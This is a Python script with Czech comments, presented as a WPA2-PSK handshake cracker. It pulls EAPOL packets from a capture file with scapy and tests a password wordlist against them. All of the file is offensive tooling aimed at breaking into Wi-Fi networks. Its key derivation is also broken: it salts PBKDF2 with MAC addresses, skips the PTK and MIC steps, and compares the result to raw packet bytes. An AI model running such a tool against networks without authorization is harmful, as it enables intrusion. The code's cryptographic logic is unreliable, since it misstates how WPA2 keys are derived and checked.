import argparse
import hashlib
import scapy.all as scapy
import binascii

def extract_handshake(cap_file):
    """Extrahuje WPA handshake ze souboru .cap"""
    packets = scapy.rdpcap(cap_file)
    handshake = []
    
    # Hledání EAPOL paketů, které obsahují WPA handshake
    for pkt in packets:
        if pkt.haslayer(scapy.EAPOL):
            handshake.append(pkt)
    
    if len(handshake) < 2:
        print("Handshakes jsou neúplné nebo chybí.")
        return None
    return handshake

def pbkdf2_sha1(password, ssid, salt, iterations=4096, key_len=32):
    """Vytvoření PBKDF2 hash pro WPA PSK"""
    ssid = ssid.encode('utf-8')
    password = password.encode('utf-8')
    dk = hashlib.pbkdf2_hmac('sha1', password, ssid + salt, iterations, key_len)
    return dk

def extract_eapol_data(handshake):
    """Extrahuje potřebná data (nonce, ap mac, client mac) z EAPOL paketů"""
    ap_mac = None
    client_mac = None
    eapol_data = []
    for pkt in handshake:
        if pkt.haslayer(scapy.EAPOL):
            eapol_data.append(pkt[scapy.EAPOL].load)
            if pkt.haslayer(scapy.Dot11):
                if not ap_mac:
                    ap_mac = pkt[scapy.Dot11].addr2
                client_mac = pkt[scapy.Dot11].addr1
    return ap_mac, client_mac, eapol_data

def check_psk(handshake, wordlist, ssid):
    """Projde slovník hesel a provede porovnání s WPA handshake"""
    ap_mac, client_mac, eapol_data = extract_eapol_data(handshake)
    
    if not ap_mac or not client_mac or not eapol_data:
        print("Chybějící data v handshake (AP MAC, Client MAC, EAPOL).")
        return None
    
    # Vytvoření saltu na základě adres
    salt = binascii.unhexlify(ap_mac.replace(":", "") + client_mac.replace(":", ""))

    # Iterování slovníkem
    for password in wordlist:
        print(f"Testuji heslo: {password}")
        derived_key = pbkdf2_sha1(password, ssid, salt)
        
        # V tomto bodě porovnáme vygenerovaný klíč s očekávaným klíčem v EAPOL paketech
        for eapol in eapol_data:
            # To, co očekáváme v eapol_data, je kryptografická kontrola na klíč
            if derived_key == eapol[:len(derived_key)]:
                print(f"Heslo nalezeno: {password}")
                return password
    
    return None

def main():
    parser = argparse.ArgumentParser(description="Crack WPA2-PSK handshake")
    parser.add_argument("cap_file", help="Soubor s WPA handshake (CAP soubor)")
    parser.add_argument("wordlist", help="Cesta k slovníku hesel")
    parser.add_argument("ssid", help="SSID sítě pro WPA2")

    args = parser.parse_args()

    # Načíst handshake z CAP souboru
    print(f"Načítám handshake z {args.cap_file}...")
    handshake = extract_handshake(args.cap_file)

    if not handshake:
        print("Nepodařilo se nalézt žádný handshake v souboru.")
        return

    # Načíst slova ze slovníku
    print(f"Načítám slovník hesel z {args.wordlist}...")
    with open(args.wordlist, 'r') as f:
        wordlist = f.read().splitlines()

    # Zkontrolovat každý záznam v slovníku
    print(f"Začínám crackování pro SSID: {args.ssid}...")
    found_password = check_psk(handshake, wordlist, args.ssid)

    if found_password:
        print(f"Úspěšně cracknuto heslo: {found_password}")
    else:
        print("Heslo nebylo nalezeno.")

if __name__ == "__main__":
    main()
